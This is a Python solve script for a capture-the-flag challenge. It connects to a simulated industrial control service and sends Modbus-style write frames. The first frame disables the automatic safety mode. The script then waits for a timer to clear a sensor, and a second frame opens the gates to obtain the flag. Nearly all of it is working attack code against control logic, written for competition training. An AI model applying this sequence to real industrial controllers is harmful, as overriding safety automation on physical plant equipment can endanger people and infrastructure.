
import socket
import time

HOST = "saveyourfriendsot-csc26.cybersecuritychallenge.al"
PORT = 9995

def recv_all(sock, timeout=3):
    sock.settimeout(timeout)
    data = b""
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
        except socket.timeout:
            break
    return data.decode(errors='replace')

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    
    # Read banner
    recv_all(sock, timeout=3)
    
    # Step 1: Read initial state
    sock.sendall(b"1\n")
    time.sleep(2)
    recv_all(sock)
    
    # Step 2: Turn OFF auto_mode
    sock.sendall(b"2\n")
    time.sleep(1)
    recv_all(sock)
    sock.sendall(b"470500670000\n")
    time.sleep(2)
    recv_all(sock)
    
    # Step 3: Verify auto_mode is OFF
    sock.sendall(b"1\n")
    time.sleep(2)
    resp = recv_all(sock)
    # Confirms: "auto_mode": 0
    
    # Step 4: Wait 185 seconds for TON0 timer
    for i in range(185, 0, -10):
        time.sleep(10)
    
    # Step 5: Verify sensor_on is now OFF
    sock.sendall(b"1\n")
    time.sleep(2)
    resp = recv_all(sock)
    # Confirms: "sensor_on": 0
    
    # Step 6: Open gates (within 30s window!)
    sock.sendall(b"2\n")
    time.sleep(1)
    recv_all(sock)
    sock.sendall(b"47050539FF00\n")
    time.sleep(2)
    recv_all(sock)
    
    # Step 7: Read final state with flag
    sock.sendall(b"1\n")
    time.sleep(2)
    print(recv_all(sock))
    
    sock.close()